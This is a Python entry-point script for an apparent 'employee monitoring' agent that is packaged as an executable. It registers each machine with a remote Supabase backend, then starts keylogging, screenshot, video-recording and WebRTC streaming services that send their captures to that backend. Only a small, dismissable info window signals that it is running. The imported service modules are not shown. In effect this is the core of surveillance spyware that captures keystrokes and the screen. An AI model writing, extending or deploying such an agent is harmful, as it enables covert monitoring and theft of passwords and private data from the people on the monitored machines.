import asyncio
import os
import socket
import sys
import uuid
import tkinter as tk
import threading
from dotenv import load_dotenv
from supabase import create_client, Client

# Import services
from services.logger import KeyloggerService
from services.monitor import ScreenshotService
from services.stream import VideoRecorderService
from services.control import ControlService
from services.webrtc import WebRTCService

# Determine path to .env when running as exe
if getattr(sys, 'frozen', False):
    application_path = sys._MEIPASS
else:
    application_path = os.path.dirname(os.path.abspath(__file__))

env_path = os.path.join(application_path, '.env')
load_dotenv(env_path)

SUPABASE_URL = os.getenv("SUPABASE_URL")
SUPABASE_KEY = os.getenv("SUPABASE_KEY")

if not SUPABASE_URL or not SUPABASE_KEY:
    print("Error: Supabase credentials not found in .env")
    sys.exit(1)

supabase: Client = create_client(SUPABASE_URL, SUPABASE_KEY)
hostname = socket.gethostname()
ip_address = socket.gethostbyname(hostname)

def show_info_window():
    root = tk.Tk()
    root.title("Alaska Agent Info")
    root.geometry("400x150")
    
    cache_path = os.path.join(os.getenv('APPDATA'), 'AlaskaCache')
    
    label = tk.Label(root, text=f"Agent Running: {hostname}", font=("Arial", 12, "bold"))
    label.pack(pady=10)
    
    path_label = tk.Label(root, text=f"Cache Path:\n{cache_path}", font=("Arial", 9), fg="blue")
    path_label.pack(pady=10)
    
    btn = tk.Button(root, text="Minimize / Hide", command=root.destroy)
    btn.pack(pady=5)
    
    root.mainloop()

async def main():
    # Register/Get Employee
    response = supabase.table("employees").select("*").eq("hostname", hostname).execute()
    
    if not response.data:
        print("Registering new employee...")
        data = {
            "hostname": hostname,
            "ip_address": ip_address,
            "settings": {"screenshot_interval": 300, "video_duration": 10, "screenshots_enabled": False}
        }
        res = supabase.table("employees").insert(data).execute()
        employee_id = res.data[0]["id"]
    else:
        print("Employee found.")
        employee_id = response.data[0]["id"]
        supabase.table("employees").update({"ip_address": ip_address, "last_seen": "now()"}).eq("id", employee_id).execute()

    # GUI Thread
    threading.Thread(target=show_info_window, daemon=True).start()

    # Initialize Services
    logger_service = KeyloggerService(supabase, employee_id)
    monitor_service = ScreenshotService(supabase, employee_id)
    stream_service = VideoRecorderService(supabase, employee_id)
    webrtc_service = WebRTCService(supabase, employee_id)

    # Run Services
    await asyncio.gather(
        logger_service.start(),
        monitor_service.start(),
        stream_service.start(),
        webrtc_service.start()
    )

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("Agent stopped.")
